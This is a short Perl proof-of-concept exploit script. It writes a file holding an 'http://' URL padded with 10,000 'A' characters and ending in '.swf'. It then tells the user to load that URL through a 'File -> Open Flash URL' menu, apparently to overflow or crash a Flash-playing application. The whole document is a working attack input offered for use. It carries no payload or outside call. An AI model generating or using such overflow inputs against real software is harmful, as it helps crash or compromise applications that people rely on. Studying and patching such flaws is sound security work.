#!/usr/bin/perl
 
use strict;
use warnings;
 
my $filename = "poc.txt";
 
my $junk = "A" x 10000;
 
open(FILE, ">$filename") || die "[-]Error:\n$!\n";
print FILE "http://$junk.swf";
close(FILE);
 
print "Exploit file created successfully [$filename]!\n";
print "Now open the URL in $filename via File -> Open Flash URL\n";

